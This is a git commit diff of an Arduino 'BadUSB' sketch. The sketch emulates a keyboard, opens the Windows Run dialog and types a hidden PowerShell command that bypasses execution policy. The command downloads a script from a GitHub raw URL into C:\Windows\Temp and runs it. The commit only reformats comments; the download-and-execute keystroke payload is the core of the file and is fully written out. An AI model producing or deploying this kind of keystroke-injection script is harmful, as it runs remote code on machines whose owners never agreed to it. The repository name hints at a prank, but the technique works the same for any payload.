03dba774dc31132bd01bb065c52ba9ae9e34fe64
CyberSpooon <137320651+CyberSpooon@users.noreply.github.com>
2025-04-01 15:13:42 -0400

    Update BadUSBScript.ino

--- BadUSBScript.ino
+++ BadUSBScript.ino
@@ -1,20 +1,17 @@
 #include <Keyboard.h>
 void setup() {
   delay(3000);
-  // Press Windows + R
-  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_LEFT_GUI); // Press Windows + R
   Keyboard.press('r');
   delay(200);
   Keyboard.releaseAll();
-  // Wait for run window
-  delay(500);
+  delay(500); // Wait for run window
   // Type command
-  Keyboard.print(
+  Keyboard.print( 
     "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
   );
   delay(900);
-  // Press Enter
-  Keyboard.press(KEY_RETURN);  
+  Keyboard.press(KEY_RETURN); // Press Enter
   Keyboard.release(KEY_RETURN);
 }
 void loop() {
